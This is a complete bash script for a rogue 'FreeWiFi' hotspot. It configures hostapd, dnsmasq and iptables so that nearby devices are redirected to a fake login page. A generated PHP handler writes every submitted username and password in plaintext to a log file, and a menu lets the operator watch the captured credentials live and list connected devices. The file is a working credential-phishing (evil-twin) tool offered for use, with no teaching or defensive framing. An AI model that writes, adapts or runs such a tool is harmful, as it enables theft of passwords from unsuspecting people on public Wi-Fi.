#!/bin/bash

PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"
HOTSPOT_IFACE="wlp4s0"
SSID="FreeWiFi"

HOSTAPD_CONF="/tmp/hostapd.conf"
DNSMASQ_CONF="/tmp/dnsmasq.conf"

# ---------------------------
# Ensure portal and logs exist
# ---------------------------
ensure_directories() {
    if [ ! -d "$PORTAL_DIR" ]; then
        echo "[+] Portal folder missing. Creating..."
        mkdir -p "$PORTAL_DIR"
    fi

    # Create index.php for iOS captive portal
    if [ ! -f "$PORTAL_DIR/index.php" ]; then
cat > "$PORTAL_DIR/index.php" <<EOF
<?php
// iOS captive portal detection
if (\$_SERVER['REQUEST_URI'] == "/hotspot-detect.html") {
    header("Location: /index.php");
    exit;
}

// Handle login submission
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$username = isset(\$_POST['username']) ? \$_POST['username'] : '';
    \$password = isset(\$_POST['password']) ? \$_POST['password'] : '';
    file_put_contents('../logs/log.txt', date('Y-m-d H:i:s') . " - USER: \$username PASS: \$password\\n", FILE_APPEND);
}
include("index.html");
?>
EOF
    fi

    # Create a default login page if missing
    if [ ! -f "$PORTAL_DIR/index.html" ]; then
cat > "$PORTAL_DIR/index.html" <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body>
<h1>Welcome to Free WiFi</h1>
<form method="POST">
<input type="text" name="username" placeholder="Username"><br>
<input type="password" name="password" placeholder="Password"><br>
<input type="submit" value="Login">
</form>
</body>
</html>
EOF
    fi

    if [ ! -d "logs" ]; then
        mkdir -p logs
    fi

    if [ ! -f "$LOG_FILE" ]; then
        touch "$LOG_FILE"
    fi
}

# ---------------------------
# Setup dependencies
# ---------------------------
setup() {
    echo "[+] Installing dependencies..."
    sudo apt update
    sudo apt install hostapd dnsmasq php-cli iptables -y
    echo "[+] Setup complete!"
}

# ---------------------------
# Create hostapd and dnsmasq configs
# ---------------------------
create_configs() {
cat > $HOSTAPD_CONF <<EOF
interface=$HOTSPOT_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > $DNSMASQ_CONF <<EOF
interface=$HOTSPOT_IFACE
dhcp-range=192.168.50.2,192.168.50.50,255.255.255.0,12h
EOF
}

# ---------------------------
# Start hotspot + captive portal
# ---------------------------
start_hotspot() {
    ensure_directories
    echo "[+] Starting hotspot on $HOTSPOT_IFACE..."
    create_configs

    sudo ip link set $HOTSPOT_IFACE down
    sudo ip addr flush dev $HOTSPOT_IFACE
    sudo ip addr add 192.168.50.1/24 dev $HOTSPOT_IFACE
    sudo ip link set $HOTSPOT_IFACE up

    # Enable IP forwarding
    sudo sysctl -w net.ipv4.ip_forward=1

    # Start hostapd & dnsmasq
    sudo hostapd $HOSTAPD_CONF -B
    sudo dnsmasq -C $DNSMASQ_CONF

    # Redirect all HTTP traffic to index.php
    sudo iptables -t nat -A PREROUTING -i $HOTSPOT_IFACE -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
    sudo iptables -t nat -A POSTROUTING -o $HOTSPOT_IFACE -j MASQUERADE

    echo "[+] Hotspot started with iOS-compatible captive portal."
    echo "    Connect your device to SSID: $SSID"
    echo "    Devices will be redirected to the login page automatically."
}

# ---------------------------
# Stop hotspot
# ---------------------------
stop_hotspot() {
    echo "[+] Stopping hotspot..."
    sudo pkill hostapd
    sudo pkill dnsmasq
    sudo iptables -t nat -F
    sudo iptables -t nat -X
    sudo sysctl -w net.ipv4.ip_forward=0
    echo "[+] Hotspot stopped."
}

# ---------------------------
# Start PHP login page server
# ---------------------------
start_server() {
    ensure_directories
    cd "$PORTAL_DIR" || exit
    php -S 0.0.0.0:80
}

# ---------------------------
# Show connected devices
# ---------------------------
show_devices() {
    echo "[+] Connected devices (DHCP leases):"
    cat /var/lib/misc/dnsmasq.leases 2>/dev/null
}

# ---------------------------
# Logs
# ---------------------------
view_logs() { cat "$LOG_FILE"; }
live_logs() { tail -f "$LOG_FILE"; }

# ---------------------------
# Edit page (auto-create folder & file if missing)
# ---------------------------
edit_page() {
    ensure_directories
    nano "$PORTAL_DIR/index.html"
}

# ---------------------------
# Main Menu
# ---------------------------
while true; do
    echo ""
    echo "====== iOS-Compatible Captive Portal Tool ======"
    echo "1) Setup Dependencies"
    echo "2) Start Hotspot + Captive Portal"
    echo "3) Stop Hotspot"
    echo "4) Start Login Page Server"
    echo "5) Show Connected Devices"
    echo "6) View Logs"
    echo "7) Live Logs"
    echo "8) Edit Login Page"
    echo "9) Exit"
    echo "==============================================="
    read -p "Select option: " choice

    case $choice in
        1) setup ;;
        2) start_hotspot ;;
        3) stop_hotspot ;;
        4) start_server ;;
        5) show_devices ;;
        6) view_logs ;;
        7) live_logs ;;
        8) edit_page ;;
        9) exit ;;
        *) echo "Invalid option" ;;
    esac
done
